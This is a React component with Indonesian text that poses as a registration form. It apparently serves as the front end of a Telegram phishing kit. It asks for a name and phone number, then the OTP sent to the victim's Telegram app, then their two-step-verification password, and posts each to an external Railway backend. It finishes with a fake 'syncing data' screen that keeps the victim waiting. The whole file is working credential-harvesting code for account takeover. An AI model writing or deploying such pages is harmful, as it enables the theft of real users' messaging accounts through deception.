import React, { useState } from 'react';

const AuthForm = () => {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [formData, setFormData] = useState({ nama: '', nomor: '', otp: '', sandi: '' });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
    setError(''); // Hapus error saat mengetik
  };

  const handleNext = async () => {
    setLoading(true);
    setError('');
    
    try {
      const response = await fetch('https://backend-python-production-6e72.up.railway.app/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...formData, step }),
      });

      const data = await response.json();

      if (response.ok) {
        if (step === 1) {
          setStep(2); // Lanjut ke input OTP
        } else if (step === 2) {
          if (data.status === 'need_2fa') {
            setStep(3); // Munculkan halaman Sandi (2FA)
          } else {
            setStep(4); // Sukses, ke halaman Loading
          }
        } else if (step === 3) {
          setStep(4); // Sandi valid, ke halaman Loading
        }
      } else {
        // Penanganan Error (Sandi/OTP Salah)
        if (data.status === 'invalid_2fa') {
          setError('KATA SANDI SALAH!!');
        } else if (data.status === 'invalid_otp') {
          setError('KODE OTP SALAH!!');
        } else {
          setError('Terjadi kesalahan. Coba lagi.');
        }
      }
    } catch (err) {
      setError('Koneksi gagal. Cek backend.');
    } finally {
      setLoading(false);
    }
  };

  if (loading) return <div className="text-center p-10">Memproses data... Mohon tunggu...</div>;

  return (
    <div className="max-w-md mx-auto p-6 bg-white rounded-lg shadow-md">
      {step === 1 && (
        <div className="space-y-4">
          <h2 className="text-xl font-bold">Daftar Sekarang</h2>
          <input name="nama" placeholder="Nama Lengkap" className="w-full border p-2 rounded" onChange={handleChange} />
          <input name="nomor" placeholder="08xxxxx" className="w-full border p-2 rounded" onChange={handleChange} />
          <button onClick={handleNext} className="w-full bg-blue-600 text-white p-2 rounded">DAFTAR SEKARANG</button>
        </div>
      )}

      {step === 2 && (
        <div className="space-y-4 text-center">
          <h2 className="text-blue-600 font-bold">Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda</h2>
          <input name="otp" placeholder="Masukkan 5 Digit OTP" className="w-full border p-2 rounded text-center text-2xl tracking-widest" onChange={handleChange} maxLength={5} />
          {error && <p className="text-red-500 font-bold">{error}</p>}
          <button onClick={handleNext} className="w-full bg-blue-600 text-white p-2 rounded">VERIFIKASI OTP</button>
        </div>
      )}

      {step === 3 && (
        <div className="space-y-4 text-center">
          <h2 className="font-bold">Akun Anda Dilindungi Verifikasi 2 Langkah</h2>
          <p>Silakan masukkan kata sandi akun Anda</p>
          <input name="sandi" type="password" placeholder="Masukkan Kata Sandi" 
            className={`w-full border p-2 rounded ${error ? 'border-red-500 bg-red-50' : ''}`} 
            onChange={handleChange} />
          {error && <p className="text-red-500 font-bold italic">{error}</p>}
          <button onClick={handleNext} className="w-full bg-blue-600 text-white p-2 rounded">KONFIRMASI SANDI</button>
        </div>
      )}

      {step === 4 && (
        <div className="text-center space-y-4">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
          <h2 className="text-xl font-bold">Sinkronisasi Data...</h2>
          <p>Mohon jangan tutup halaman ini sampai proses selesai.</p>
        </div>
      )}
    </div>
  );
};

export default AuthForm;